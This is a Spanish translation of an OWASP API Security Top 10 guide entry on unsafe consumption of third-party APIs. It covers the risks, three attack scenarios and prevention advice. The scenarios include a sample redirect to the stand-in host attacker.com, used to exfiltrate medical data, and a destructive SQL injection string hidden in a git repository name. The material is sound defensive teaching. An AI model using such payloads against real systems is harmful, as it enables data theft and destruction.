# API10:2023 Consumo Inseguro de APIs

| Agentes de amenaza/Vectores de ataque | Debilidad de seguridad | Impactos |
| - | - | - |
| Específico de API: Explotabilidad **Fácil** | Prevalencia **Común** : Detectabilidad **Media** | Técnico **Grave** : Específico del negocio |
| Explotar este problema requiere que los atacantes identifiquen y potencialmente comprometan otras APIs/servicios con los que la API objetivo esté integrada. Usualmente, esta información no es pública o la API/servicio integrado no es fácilmente explotable. | Los desarrolladores tienden a confiar y no verificar los endpoints que interactúan con APIs externas o de terceros, confiando en requisitos de seguridad más débiles, como los relacionados con la seguridad del transporte, la autenticación/autorización y la validación/sanitización de entradas. Los atacantes necesitan identificar los servicios con los que la API objetivo se integra (fuentes de datos) y eventualmente comprometerlos. | El impacto varía según lo que la API objetivo haga con los datos obtenidos. Una explotación exitosa puede llevar a la exposición de información sensible a actores no autorizados, diversos tipos de inyecciones o denegación de servicio. |

## ¿Es vulnerable la API?

Los desarrolladores tienden a confiar más en los datos recibidos de APIs de terceros que en la entrada de usuarios. Esto es especialmente cierto para APIs ofrecidas por compañías conocidas. Debido a esto, los desarrolladores tienden a adoptar estándares de seguridad más débiles, por ejemplo, en cuanto a validación y sanitización de entradas.  

La API puede ser vulnerable si:  

* Interactúa con otras APIs a través de un canal no cifrado.  
* No valida ni sanitiza adecuadamente los datos obtenidos de otras APIs antes de procesarlos o pasarlos a componentes descendentes.  
* Sigue redirecciones ciegamente.  
* No limita el número de recursos disponibles para procesar respuestas de servicios de terceros.  
* No implementa *timeouts* para interacciones con servicios de terceros.  

## Ejemplos de Escenarios de Ataque

### Escenario #1

Una API depende de un servicio de terceros para enriquecer direcciones comerciales proporcionadas por los usuarios. Cuando un usuario envía una dirección a la API, esta la envía al servicio de terceros y los datos devueltos se almacenan en una base de datos local habilitada para SQL.  

Actores maliciosos utilizan el servicio de terceros para almacenar un payload de inyección SQL asociado con un negocio creado por ellos. Luego atacan a la API vulnerable proporcionando una entrada específica que hace que la API obtenga su "negocio malicioso" desde el servicio de terceros. El payload de SQLi termina ejecutándose en la base de datos, exfiltrando datos hacia un servidor controlado por el atacante.  

### Escenario #2

Una API se integra con un proveedor de servicios de terceros para almacenar de forma segura información médica sensible de los usuarios. Los datos se envían a través de una conexión segura usando una solicitud HTTP como la siguiente:  

```
POST /user/store_phr_record
{
  "genome": "ACTAGTAG__TTGADDAAIICCTT…"
}
```

Actores maliciosos encuentran una forma de comprometer la API de terceros y esta comienza a responder con un `308 Permanent Redirect` a solicitudes como la anterior:  

```
HTTP/1.1 308 Permanent Redirect
Location: https://attacker.com/
```

Dado que la API sigue ciegamente las redirecciones del tercero, repetirá la misma solicitud incluyendo los datos sensibles del usuario, pero esta vez hacia el servidor del atacante.  

### Escenario #3

Un atacante puede preparar un repositorio git llamado `'; drop db;--`.  

Cuando una aplicación vulnerable se integra con el repositorio malicioso, se utiliza el payload de inyección SQL en la aplicación que construye una consulta SQL asumiendo que el nombre del repositorio es una entrada segura.  

## Cómo Prevenir

* Al evaluar proveedores de servicios, evalúa también su postura de seguridad en APIs.  
* Asegura que todas las interacciones de APIs ocurran sobre un canal de comunicación seguro (TLS).  
* Valida y sanitiza siempre los datos recibidos de APIs integradas antes de usarlos.  
* Mantén una lista de permitidos (*allowlist*) de ubicaciones conocidas a las que las APIs integradas pueden redirigir: no sigas redirecciones ciegamente.  

## Referencias

### OWASP

* [Web Service Security Cheat Sheet][1]  
* [Injection Flaws][2]  
* [Input Validation Cheat Sheet][3]  
* [Injection Prevention Cheat Sheet][4]  
* [Transport Layer Protection Cheat Sheet][5]  
* [Unvalidated Redirects and Forwards Cheat Sheet][6]  

### Externas

* [CWE-20: Improper Input Validation][7]  
* [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor][8]  
* [CWE-319: Cleartext Transmission of Sensitive Information][9]  

[1]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html  
[2]: https://www.owasp.org/index.php/Injection_Flaws  
[3]: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html  
[4]: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html  
[5]: https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html  
[6]: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html  
[7]: https://cwe.mitre.org/data/definitions/20.html  
[8]: https://cwe.mitre.org/data/definitions/200.html  
[9]: https://cwe.mitre.org/data/definitions/319.html  
